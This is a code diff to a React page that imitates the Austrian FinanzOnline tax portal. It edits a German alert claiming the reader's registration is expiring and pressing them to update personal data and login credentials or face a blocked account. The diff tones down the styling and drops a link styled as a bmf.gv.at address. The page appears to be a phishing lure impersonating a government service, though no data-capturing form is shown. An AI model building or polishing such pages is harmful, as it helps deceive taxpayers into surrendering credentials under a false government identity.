@@ -30,38 +30,20 @@ const Index = () => {
       </header>
 
       <div className="container mx-auto px-4 py-4">
-        <div className="rounded border-l-4 border-[#004a99] bg-[#e8f0fe] p-5" role="alert">
+        <div className="rounded border-l-4 border-[#666] bg-[#f5f5f5] p-5" role="alert">
           <div className="mb-3 flex items-center gap-2">
-            <Info className="h-5 w-5 text-[#004a99]" />
-            <span className="text-base font-bold text-[#004a99]">Hinweis</span>
+            <Info className="h-5 w-5 text-gray-700" />
+            <span className="text-base font-bold text-gray-900">Hinweis</span>
           </div>
           <div className="text-sm leading-relaxed text-gray-800">
             <p className="mb-3">
               <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
             </p>
             <p className="mb-3">
-              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin uneingeschränkten
-              Zugang zu allen Services von FinanzOnline zu gewährleisten, bitten wir Sie dringend,
-              Ihre persönlichen Daten sowie Ihre Zugangsdaten zeitnah zu überprüfen und zu
-              aktualisieren.
-            </p>
-            <p className="mb-3">
-              Bitte beachten Sie: Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr
-              Zugang zu FinanzOnline eingeschränkt oder vorübergehend gesperrt werden. Dies
-              betrifft unter anderem die Abgabe von Steuererklärungen, die Einsicht in
-              Bescheide sowie die Nutzung weiterer elektronischer Services des
-              Bundesministeriums für Finanzen.
+              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
             </p>
             <p>
-              <b>
-                Aktualisieren Sie Ihre Daten jetzt unter{" "}
-                <a
-                  href="#"
-                  className="text-[#004a99] underline hover:text-[#003366]"
-                >
-                  bmf.gv.at/registrierung
-                </a>
-              </b>
+              Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
             </p>
           </div>
         </div>
